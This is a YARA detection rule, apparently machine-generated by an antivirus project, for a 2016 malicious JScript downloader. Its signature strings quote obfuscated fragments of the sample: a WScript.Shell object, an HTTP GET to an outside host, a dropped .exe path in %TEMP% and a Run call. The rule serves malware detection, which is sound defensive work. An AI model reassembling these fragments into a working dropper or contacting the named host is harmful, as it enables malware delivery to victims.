rule sig_20160330_7eaa64fe9aee18da664d1e5e0f43bba5 {
  meta:
    description = "datamaliciousorder - file 20160330_7eaa64fe9aee18da664d1e5e0f43bba5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "15cb64ffd15f921b258c855cbcb13f28035b2315a735dfda315c02b5761550ba"

  strings:
    $s1  = "_SE[_K](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "function _V(_TQ, _YM){_GK = _GK * 1; return _TQ - _YM;};" fullword ascii
    $s3  = "var _TL = function _EZ() {return WScript[_J](\"WScript\"+\".Shell\");}(), _L = 11;" fullword ascii
    $s4  = "if (_SE[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _DP() {return _TL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"S39Cd7J8sG.ex\" + \"e\";};" fullword ascii
    $s6  = "function _WB(){return _R + \"\";};" fullword ascii
    $s7  = "function _X(_D0){_TL[\"Run\"](_D0, _GK, _GK);};" fullword ascii
    $s8  = "function _D() {return ((_J1 == true) && (_J1 == _U)) ? 1 : _GK;};" fullword ascii
    $s9  = "var _V0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _BD(_WI) {var _N = (1, 2, 3, 4, 5, _WI); return _N;};" fullword ascii
    $s11 = "function _RP(){return _J;};" fullword ascii
    $s12 = " while (_TH){" fullword ascii
    $s13 = "function _LE()" fullword ascii
    $s14 = "function _QR(){return 22;};" fullword ascii
    $s15 = "return _V(_HP, _Y);" fullword ascii
    $s16 = "var _U = false;" fullword ascii
    $s17 = "_U = true; " fullword ascii
    $s18 = "var _FK = false;" fullword ascii
    $s19 = "var _J1 = false;" fullword ascii
    $s20 = "_J1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}